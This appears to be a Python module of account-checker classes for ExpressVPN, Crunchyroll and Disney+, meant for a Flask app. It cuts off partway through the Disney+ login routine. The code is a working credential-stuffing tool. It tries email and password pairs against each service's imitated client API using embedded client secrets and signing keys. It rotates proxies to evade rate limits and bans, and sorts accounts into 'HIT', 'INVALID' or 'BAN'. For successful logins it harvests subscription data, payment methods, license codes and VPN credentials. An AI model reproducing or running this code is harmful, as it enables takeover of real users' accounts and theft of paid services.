# checkers.py
"""
Checker classes for ExpressVPN, Crunchyroll, Disney+.
Import this into your Flask app.
"""

import os
import sys
import json
import base64
import gzip
import hmac
import hashlib
import random
import string
import re
import time
import urllib3
import urllib.parse
import uuid
from datetime import datetime, date, timedelta, timezone
from typing import Dict, List, Optional, Any
import requests

# ==================== ProxyManager ====================
class ProxyManager:
    def __init__(self, proxy_list: List[str]):
        self.proxies = proxy_list
        self.current_index = 0

    def _parse_proxy(self, raw: str) -> str:
        raw = raw.strip()
        if raw.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            return raw
        parts = raw.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return f"http://{user}:{pwd}@{ip}:{port}"
        if len(parts) == 2:
            ip, port = parts
            return f"http://{ip}:{port}"
        return raw

    def get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        raw = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        return self._parse_proxy(raw)

    def reset(self):
        self.current_index = 0

# ==================== ExpressVPN Checker ====================
class AesCryptographyService:
    def decrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives.padding import PKCS7
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(data) + decryptor.finalize()
        unpadder = PKCS7(128).unpadder()
        unpadded = unpadder.update(decrypted) + unpadder.finalize()
        return unpadded

    def encrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives.padding import PKCS7
        padder = PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return encryptor.update(padded) + encryptor.finalize()

class CryptoHelper:
    @staticmethod
    def get_byte_array(size: int) -> bytes:
        return os.urandom(size)
    @staticmethod
    def compute_signature(data: bytes, key: bytes) -> str:
        return base64.b64encode(hmac.new(key, data, hashlib.sha1).digest()).decode('ascii')
    @staticmethod
    def gzip_data(input_str: str) -> bytes:
        return gzip.compress(input_str.encode('ascii'), compresslevel=9)
    @staticmethod
    def envelope_encrypt(data: bytes, cert_base64: str) -> bytes:
        from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
        from cryptography import x509 as crypto_x509
        from asn1crypto import cms, core, x509
        cert_der = base64.b64decode(cert_base64)
        cert = x509.Certificate.load(cert_der)
        aes_key = os.urandom(16)
        iv = os.urandom(16)
        aes_service = AesCryptographyService()
        encrypted_content = aes_service.encrypt(data, aes_key, iv)
        crypto_cert = crypto_x509.load_der_x509_certificate(cert_der)
        public_key = crypto_cert.public_key()
        encrypted_key = public_key.encrypt(aes_key, asym_padding.PKCS1v15())
        recipient_info = cms.RecipientInfo({
            'ktri': cms.KeyTransRecipientInfo({
                'version': cms.CMSVersion(0),
                'rid': cms.RecipientIdentifier({
                    'issuer_and_serial_number': cms.IssuerAndSerialNumber({
                        'issuer': cert['tbs_certificate']['issuer'],
                        'serial_number': cert['tbs_certificate']['serial_number']
                    })
                }),
                'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
                    'algorithm': '1.2.840.113549.1.1.1',
                    'parameters': core.Null()
                }),
                'encrypted_key': encrypted_key
            })
        })
        enveloped_data = cms.EnvelopedData({
            'version': cms.CMSVersion(0),
            'recipient_infos': cms.RecipientInfos([recipient_info]),
            'encrypted_content_info': cms.EncryptedContentInfo({
                'content_type': '1.2.840.113549.1.7.1',
                'content_encryption_algorithm': cms.EncryptionAlgorithm({
                    'algorithm': '2.16.840.1.101.3.4.1.2',
                    'parameters': iv
                }),
                'encrypted_content': encrypted_content
            })
        })
        content_info = cms.ContentInfo({
            'content_type': '1.2.840.113549.1.7.3',
            'content': enveloped_data
        })
        return content_info.dump()

class ExpressVPNChecker:
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
        self.cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
        self.hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
        self.crypto = AesCryptographyService()
    def _get_session(self):
        session = requests.Session()
        session.headers.update({'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2'})
        return session
    def generate_install_id(self) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=64))
    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'email': email, 'password': password, 'status': 'FAIL', 'data': {}}
        try:
            iv = CryptoHelper.get_byte_array(16)
            key = CryptoHelper.get_byte_array(16)
            base64_iv = base64.b64encode(iv).decode('ascii')
            base64_key = base64.b64encode(key).decode('ascii')
            install_id = self.generate_install_id()
            post_data_dict = {"email": email, "iv": base64_iv, "key": base64_key, "password": password}
            post_data = json.dumps(post_data_dict)
            gzipped = CryptoHelper.gzip_data(post_data)
            encrypted_post = CryptoHelper.envelope_encrypt(gzipped, self.cert_base64)
            header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            header_signature = CryptoHelper.compute_signature(header_raw.encode('ascii'), self.hmac_key.encode('ascii'))
            post_signature = CryptoHelper.compute_signature(encrypted_post, self.hmac_key.encode('ascii'))
            proxy_str = self.proxy_manager.get_proxy() if self.proxy_manager else None
            proxies = {'http': proxy_str, 'https': proxy_str} if proxy_str else None
            session = self._get_session()
            url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            headers = {
                'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
                'Expect': '',
                'Content-Type': 'application/octet-stream',
                'X-Body-Compression': 'gzip',
                'X-Signature': f'2 {header_signature} 91c776e',
                'X-Body-Signature': f'2 {post_signature} 91c776e',
                'Accept-Language': 'en',
                'Accept-Encoding': 'gzip, deflate'
            }
            response = session.post(url, data=encrypted_post, headers=headers, proxies=proxies, timeout=15, verify=False)
            if response.status_code in (401, 400):
                result['status'] = 'INVALID'; return result
            if response.status_code == 500:
                result['status'] = 'BAN'; return result
            if response.status_code != 200:
                result['status'] = 'ERROR'; result['error'] = f'HTTP {response.status_code}'; return result
            try:
                decrypted = self.crypto.decrypt(response.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
                response_body = decrypted.decode('utf-8', errors='ignore')
            except:
                result['status'] = 'ERROR'; result['error'] = 'Decryption failed'; return result
            try:
                access_token = re.search(r'"access_token":"([^"]+)"', response_body).group(1)
                ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', response_body).group(1)
                ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', response_body).group(1)
                pptp_user = re.search(r'"pptp_username":"([^"]+)"', response_body).group(1)
                pptp_pass = re.search(r'"pptp_password":"([^"]+)"', response_body).group(1)
            except:
                result['status'] = 'ERROR'; result['error'] = 'Failed to parse tokens'; return result
            sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
            sub_signature = CryptoHelper.compute_signature(sub_raw.encode('ascii'), self.hmac_key.encode('ascii'))
            batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_signature = CryptoHelper.compute_signature(batch_raw.encode('ascii'), self.hmac_key.encode('ascii'))
            capture_body = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"2 {sub_signature} 91c776e"}},"method":"GET","url":"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"}}]'
            capture_signature = CryptoHelper.compute_signature(capture_body.encode('ascii'), self.hmac_key.encode('ascii'))
            batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_headers = {
                'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
                'X-Body-Compression': 'gzip',
                'X-Signature': f'2 {batch_signature} 91c776e',
                'X-Body-Signature': f'2 {capture_signature} 91c776e',
                'Accept-Language': 'en',
                'Accept-Encoding': 'gzip, deflate'
            }
            batch_response = session.post(batch_url, data=capture_body, headers=batch_headers, proxies=proxies, timeout=15, verify=False)
            if 'subscription' not in batch_response.text or 'REVOKED' in batch_response.text or 'status\\\":\\\"\\\"' in batch_response.text:
                result['status'] = 'EXPIRED'; return result
            unescaped = batch_response.text.encode().decode('unicode_escape')
            plan_match = re.search(r'billing_cycle":(\d+)', unescaped)
            plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"
            auto_renew_match = re.search(r'auto_bill":([^,]+)', unescaped)
            auto_renew = auto_renew_match.group(1) if auto_renew_match else "false"
            exp_match = re.search(r'expiration_time":(\d+)', unescaped)
            expiration = int(exp_match.group(1)) if exp_match else 0
            current_time = int(time.time())
            days_left = round((expiration - current_time) / 86400) if expiration > current_time else 0
            expire_date = datetime.fromtimestamp(expiration).strftime('%Y-%m-%d') if expiration else 'N/A'
            payment_match = re.search(r'payment_method":"([^"]+)"', unescaped)
            payment = payment_match.group(1) if payment_match else "Unknown"
            web_headers = {
                'Host': 'www.expressvpn.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Referer': 'https://portal.expressvpn.com/my-subscriptions',
                'authorization': f'Bearer {access_token}',
                'content-type': 'application/json',
                'x-tenant': 'xvpn',
                'Origin': 'https://portal.expressvpn.com',
                'Connection': 'keep-alive'
            }
            try:
                web_resp = session.get('https://www.expressvpn.com/api/v2/subscriptions', headers=web_headers, proxies=proxies, timeout=15, verify=False)
                licenses = re.findall(r'longCode":"([^"]+)"', web_resp.text)
                license_code = licenses[-1] if licenses else "N/A"
            except:
                license_code = "N/A"
            session.close()
            result['status'] = 'HIT'
            result['data'] = {
                'plan': plan,
                'auto_renew': auto_renew == 'true',
                'expire_date': expire_date,
                'days_left': days_left,
                'payment_method': payment,
                'license': license_code,
                'ovpn_user': ovpn_user,
                'ovpn_pass': ovpn_pass,
                'pptp_user': pptp_user,
                'pptp_pass': pptp_pass
            }
        except Exception as e:
            result['status'] = 'ERROR'; result['error'] = str(e)
        return result

# ==================== Crunchyroll Checker ====================
CR_MAP = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra",
    "AO": "Angola", "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia",
    "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
    "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan",
    "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana", "BR": "Brazil",
    "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi",
    "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
    "CF": "Central African Republic", "TD": "Chad", "CL": "Chile", "CN": "China",
    "CO": "Colombia", "KM": "Comoros", "CG": "Congo", "CD": "DR Congo",
    "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
    "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
    "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
    "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland",
    "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
    "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada",
    "GT": "Guatemala", "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana",
    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
    "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
    "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
    "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
    "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
    "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
    "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
    "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
    "MR": "Mauritania", "MU": "Mauritius", "MX": "Mexico", "FM": "Micronesia",
    "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
    "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia",
    "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands", "NZ": "New Zealand",
    "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway",
    "OM": "Oman", "PK": "Pakistan", "PW": "Palau", "PS": "Palestine",
    "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru",
    "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
    "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
    "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
    "SL": "Sierra Leone", "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia",
    "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan",
    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname",
    "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
    "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand",
    "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga", "TT": "Trinidad and Tobago",
    "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TV": "Tuvalu",
    "UG": "Uganda", "UA": "Ukraine", "AE": "UAE", "GB": "United Kingdom",
    "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VU": "Vanuatu",
    "VE": "Venezuela", "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia",
    "ZW": "Zimbabwe",
}
CR_PLANS = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}
CR_CID = "rjs0ltx0dbwkliwxdzdf"
CR_SEC = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
CR_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
CR_WUA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
          "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")
CR_API = "https://beta-api.crunchyroll.com"

class CrunchyrollChecker:
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'email': email, 'password': password, 'status': 'FAIL', 'data': {}}
        proxy_str = self.proxy_manager.get_proxy() if self.proxy_manager else None
        session = requests.Session()
        if proxy_str:
            session.proxies = {"http": proxy_str, "https": proxy_str}

        try:
            device_id = str(uuid.uuid4())
            anon_id = str(uuid.uuid4())

            resp = session.post(
                f"{CR_API}/auth/v1/token",
                data={
                    "grant_type": "password",
                    "username": email,
                    "password": password,
                    "scope": "offline_access",
                    "client_id": CR_CID,
                    "client_secret": CR_SEC,
                    "device_type": "Google SDK built for x86",
                    "device_id": device_id,
                    "device_name": "sdk_google_atv_x86",
                },
                headers={
                    "User-Agent": CR_UA,
                    "Accept": "application/json",
                    "Accept-Charset": "UTF-8",
                    "Accept-Encoding": "gzip",
                    "Connection": "Keep-Alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "ETP-Anonymous-ID": anon_id,
                    "Request-Type": "SignIn",
                },
                timeout=20
            )

            text = resp.text

            if resp.status_code == 429 or "too_many_requests" in text or "rate limited" in text.lower():
                result['status'] = 'RATE'
                return result

            if any(k in text for k in ("invalid_grant", "invalid_credentials")) or resp.status_code in (401, 400):
                result['status'] = 'INVALID'
                return result

            try:
                data = resp.json()
            except:
                result['status'] = 'ERROR'
                result['error'] = f"JSON parse error ({resp.status_code})"
                return result

            token = data.get("access_token")
            if not token:
                result['status'] = 'ERROR'
                result['error'] = "No access token"
                return result

            def headers():
                return {
                    "Authorization": f"Bearer {token}",
                    "User-Agent": CR_WUA,
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                }

            username = ""
            try:
                r = session.get(f"{CR_API}/accounts/v1/me/multiprofile", headers=headers(), timeout=20)
                m = re.search(r'"username"\s*:\s*"([^"]+)"', r.text)
                if m:
                    username = m.group(1)
            except:
                pass

            r = session.get(f"{CR_API}/accounts/v1/me", headers=headers(), timeout=20)
            try:
                account = r.json()
            except:
                account = {}

            external_id = account.get("external_id", "")
            verified = account.get("email_verified", False)
            account_id = account.get("account_id", "")
            if not username:
                username = account.get("username", email.split("@")[0])

            info = {
                "user": username,
                "verified": "Yes" if verified else "No",
                "plan": "",
                "streams": "",
                "expires": "",
                "renew": "",
                "country": "",
                "payment": "",
                "sku": "",
            }

            if not external_id:
                result['status'] = 'FREE'
                result['data'] = info
                return result

            r = session.get(f"{CR_API}/subs/v1/subscriptions/{external_id}/benefits", headers=headers(), timeout=20)
            benefits_text = r.text

            no_sub = any(x in benefits_text for x in (
                "subscription.not_found", "Subscription Not Found",
                '"total":0', '"subscription_country":""'
            ))
            if no_sub or "concurrent_streams" not in benefits_text:
                result['status'] = 'FREE'
                result['data'] = info
                return result

            result['status'] = 'HIT'

            m = re.search(r'"concurrent_streams\.(\d+)"', benefits_text)
            if m:
                streams = m.group(1)
                info["streams"] = streams
                info["plan"] = CR_PLANS.get(streams, f"PLAN_{streams}")

            m = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', benefits_text)
            if m:
                cc = m.group(1)
                info["country"] = CR_MAP.get(cc, cc)

            m = re.search(r'"source"\s*:\s*"([^"]+)"', benefits_text)
            if m:
                info["payment"] = m.group(1)

            if account_id:
                try:
                    r = session.get(f"{CR_API}/subs/v3/subscriptions/{account_id}", headers=headers(), timeout=20)
                    sub3 = r.text
                    m = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', sub3)
                    if m:
                        info["expires"] = m.group(1)
                    m = re.search(r'"auto_renew"\s*:\s*(true|false)', sub3)
                    if m:
                        info["renew"] = "Yes" if m.group(1) == "true" else "No"
                    m = re.search(r'"sku"\s*:\s*"([^"]+)"', sub3)
                    if m:
                        info["sku"] = m.group(1)
                except:
                    pass

            result['data'] = info
            return result

        except requests.exceptions.ProxyError:
            result['status'] = 'ERROR'
            result['error'] = "Proxy error"
            return result
        except requests.exceptions.Timeout:
            result['status'] = 'ERROR'
            result['error'] = "Timeout"
            return result
        except requests.exceptions.ConnectionError:
            result['status'] = 'ERROR'
            result['error'] = "Connection failed"
            return result
        except Exception as e:
            result['status'] = 'ERROR'
            result['error'] = str(e)[:80]
            return result

# ==================== Disney+ Checker ====================
class DisneyChecker:
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
        self.device_auth = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
        self.register_url = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
        self.graphql_url = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
        self.subscribers_url = "https://disney.api.edge.bamgrid.com/v2/subscribers"
        self.login_query = '''mutation login($input: LoginInput!) { login(login: $input) { account { ...account profiles { ...profile } } actionGrant activeSession { ...session } identity { ...identity } } }
fragment identity on Identity {
    attributes { securityFlagged createdAt passwordResetRequired }
    flows { marketingPreferences { eligibleForOnboarding isOnboarded } personalInfo { eligibleForCollection requiresCollection } }
    personalInfo { dateOfBirth gender }
    subscriber {
        subscriberStatus subscriptionAtRisk overlappingSubscription doubleBilled doubleBilledProviders
        subscriptions {
            id groupId state partner isEntitled source { sourceType sourceProvider sourceRef subType }
            paymentProvider
            product {
                id sku offerId promotionId name
                nextPhase { sku offerId campaignCode voucherCode }
                entitlements { id name desc partner }
                categoryCodes
                redeemed { campaignCode redemptionCode voucherCode }
                bundle bundleType subscriptionPeriod earlyAccess trial { duration }
            }
            term { purchaseDate startDate expiryDate nextRenewalDate pausedDate churnedDate isFreeTrial }
            externalSubscriptionId
            cancellation { type restartEligible }
            stacking { status overlappingSubscriptionProviders previouslyStacked previouslyStackedByProvider }
        }
    }
}
fragment account on Account {
    id
    attributes {
        blocks { expiry reason }
        consentPreferences { dataElements { name value } purposes { consentDate firstTransactionDate id lastTransactionCollectionPointId lastTransactionCollectionPointVersion lastTransactionDate name status totalTransactionCount version } }
        dssIdentityCreatedAt email emailVerified lastSecurityFlaggedAt
        locations { manual { country } purchase { country source } registration { geoIp { country } } }
        securityFlagged tags taxId userVerified
    }
    parentalControls { isProfileCreationProtected }
    flows { star { isOnboarded } }
}
fragment profile on Profile {
    id name isAge21Verified
    attributes {
        avatar { id userSelected }
        isDefault kidsModeEnabled
        languagePreferences { appLanguage playbackLanguage preferAudioDescription preferSDH subtitleAppearance { backgroundColor backgroundOpacity description font size textColor } subtitleLanguage subtitlesEnabled }
        groupWatch { enabled }
        parentalControls { kidProofExitEnabled isPinProtected }
        playbackSettings { autoplay backgroundVideo prefer133 preferImaxEnhancedVersion previewAudioOnHome previewVideoOnHome }
    }
    personalInfo { dateOfBirth gender age }
    maturityRating { ratingSystem ratingSystemValues contentMaturityRating maxRatingSystemValue isMaxContentMaturityRating }
    flows { personalInfo { eligibleForCollection requiresCollection } star { eligibleForOnboarding isOnboarded } }
}
fragment session on Session {
    device { id platform }
    entitlements features { coPlay }
    inSupportedLocation isSubscriber
    location { type countryCode dma asn regionName connectionType zipCode }
    sessionId experiments { featureId variantId version }
    identity { id }
    account { id }
    profile { id parentalControls { liveAndUnratedContent { enabled } } }
    partnerName preferredMaturityRating { impliedMaturityRating ratingSystem }
    homeLocation { countryCode }
    portabilityLocation { countryCode type }
}'''
        self.ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        ]

    def _register_device(self, sess, ua):
        headers = {
            'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.9',
            'authorization': self.device_auth, 'Content-Type': 'application/json',
            'Origin': 'https://www.disneyplus.com', 'Referer': 'https://www.disneyplus.com/',
            'User-Agent': ua, 'x-application-version': 'd2adb22e',
            'x-bamsdk-client-id': 'disney-svod-3d9324fc',
            'x-bamsdk-platform': 'javascript/windows/chrome',
            'X-BAMSDK-Platform-Id': 'browser', 'x-bamsdk-version': 'd2adb22e-dplus-mlp',
        }
        body = {
            "query": "mutation registerDevice($input: RegisterDeviceInput!) { registerDevice(registerDevice: $input) { grant { grantType assertion } } }",
            "variables": {"input": {
                "deviceFamily": "browser", "applicationRuntime": "chrome", "deviceProfile": "windows",
                "deviceLanguage": "en-US",
                "attributes": {"osDeviceIds": [], "manufacturer": "microsoft", "model": None,
                               "operatingSystem": "windows", "operatingSystemVersion": "10.0",
                               "browserName": "chrome", "browserVersion": "131.0.6778.86"}
            }}
        }
        r = sess.post(self.register_url, headers=headers, json=body, timeout=25)
        m = re.search(r'"accessToken":"(.*?)"', r.text)
        return (m.group(1) if m else ''), r.text

    def _check_email(self, sess, ua, device_token, email):
        headers = {
            'accept': 'application/json', 'authorization': device_token,
            'content-type': 'application/json', 'user-agent': ua,
            'x-bamsdk-client-id': 'disney-svod-3d9324fc',
            'x-bamsdk-platform': 'android/google/handset', 'x-bamsdk-version': '9.20.0',
        }
        body = {"operationName": "check", "variables": {"email": email},
                "query": "query check($email: String!) { check(email: $email) { operations nextOperation } }"}
        r = sess.post(self.graphql_url, headers=headers, json=body, timeout=25)
        return r.text

    def _login(self, sess, ua, device_token, email, password):
        headers = {
            'accept': 'application/json', 'authorization': device_token,
            'content-type': 'application/json', 'user-agent': ua,
            'x-bamsdk-client-id': 'disney-svod-3d9324fc',
            'x-bamsdk-platform': 'android/google/handset', 'x-bamsdk-version': '9.20.0',
        }
        body = {"query": self.login_query, "operationName": "login",
                "variables": {"input": {"email": email, "password": password}}}
        r = sess.post(self.graphql_url, headers=headers, json=body, timeout=25)
        return r.text

    def _subscribers(self, sess, ua, login_token):
        headers = {
            'authorization': f'Bearer {login_token}',
            'content-type': 'application/json; charset=utf-8',
            'origin': 'https://www.disneyplus.com', 'referer': 'https://www.disneyplus.com/',
            'user-agent': ua, 'x-bamsdk-client-id': 'disney-svod-3d9324fc',
            'x-bamsdk-platform': 'windows', 'x-bamsdk-version': '12.0',
        }
        r = sess.get(self.subscribers_url, headers=headers, timeout=25)
        return r.text

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'email': email, 'password': password, 'status': 'FAIL', 'data': {}}
        proxy_str = self.proxy_manager.get_proxy() if self.proxy_manager else None
        session = requests.Session()
        if proxy_str:
            session.proxies = {"http": proxy_str, "https": proxy_str}

        ua = random.choice(self.ua_pool)
        try:
            device_token, dev_text = self._register_device(session, ua)
            if not device_token or 'forbidden-location' in dev_text.lower():
                result['status'] = 'ERROR'
                result['error'] = 'Device registration failed (geo-block?)'
                return result

            check_text = self._check_email(session, ua, device_token, email)
            low = check_text.lower()
            if 'password-reset-required' in low:
                result['status'] = 'RESET'
                result['error'] = 'Password reset required'
                return result
            if any(k in check_text for k in ['"operations":["Register"', '"operations":["RegisterAccount"']):
                result['status'] = 'INVALID'
                result['error'] = 'Email not registered'
                return result
            if '403 error' in low or 'cloudfront' in low:
                result['status'] = 'ERROR'
                result['error'] = 'Geo-blocked or IP banned'
                return result

            login_text = self._login(session, ua, device_token, email, password)
            low = login_text.lower()
            if 'bad-credentials' in low or 'account is blocked' in low:
                result['status'] = 'INVALID'
                result['error'] = 'Invalid credentials'
                return result
            if 'password-reset-required' in low:
                result['status'] = 'RESET'
                result['error'] = 'Password reset required'
                return result
            if '{"data":{"login"' not in login_text and 'issubscriber":true' not in low:
                result['status'] = 'ERROR'
                result['error'] = 'Login response invalid'
                return result

            info = {}
            m = re.search(r'\{"accessToken":"(.*?)"', login_text)
            login_token = m.group(1) if m else ''
            info['access_token'] = login_token

